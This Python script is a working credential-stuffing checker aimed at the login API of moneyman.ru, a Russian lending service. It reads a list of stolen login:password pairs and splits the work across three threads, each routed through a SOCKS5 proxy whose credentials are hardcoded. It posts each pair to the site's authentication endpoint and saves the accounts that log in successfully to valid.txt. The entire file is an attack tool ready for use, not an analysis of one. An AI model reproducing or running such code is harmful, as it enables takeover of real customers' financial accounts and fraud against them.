import requests
import re
from colorama import init, Fore
import time
from requests.auth import HTTPProxyAuth
import threading


def checker(dir_, l):
    print('haha')
    file = open(dir_).read().split('\n')

    proxies = {0: {'http': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.29:40076',
                   'https': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.28:40076'},
               1: {'http': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.29:40060',
                   'https': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.29:40060'},
               2: {'http': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.29:40048',
                   'https': 'socks5://iparchitect_13927_22_07_22:Q5nHZa9QhkAdeR2458@188.143.169.29:40048'}, }
    for account in file[(len(file) // 3) * l: (len(file) // 3) * l + (len(file) // 3)]:
        print(account)
        try:
            if ':' in account:
                login = account.split(":")[0]
                password = account.split(":")[1]
            elif ';' in account:
                login = account.split(";")[0]
                password = account.split(";")[1]
            url = 'https://moneyman.ru/secure/rest/authentication/login'
            myobj = {"username": login, "password": password, "login": login, "remember": "true"}
            # print(proxies[l])
            x = requests.post(url, json=myobj, proxies=proxies[l])
            js = x.json()
            # answ = js['exception']['login']
            print(js)
            try:
                if js['status'] == 'OK_REDIRECT':
                    print(Fore.GREEN + login + ":" + password)
                    output = open('valid.txt', 'a', encoding='utf-8')
                    output.write(account + '\n')
                    output.close()
            except:
                print(Fore.RED + login + ":" + password)
                # if js['exception']['login'] == "Неверный логин или пароль." or 'Время блокировки вашего аккаунта еще не истекло. Время блокировки составляет' in js['exception']['login'] or 'Вы три раза ввели' in js['exception']['login']:
            time.sleep(2)
        except Exception as ex:
            print(f'1123123123123   {ex}')
            time.sleep(60)


def main():
    q = str(input('Перетащи сюда базу для проверки: '))

    if '.txt' in q:
        dir_ = q
    else:
        dir_ = q + '.txt'

    for i in range(0, 3):
        threading.Thread(target=checker, args=(dir_, i)).start()
    #checker(dir_,1)


main()
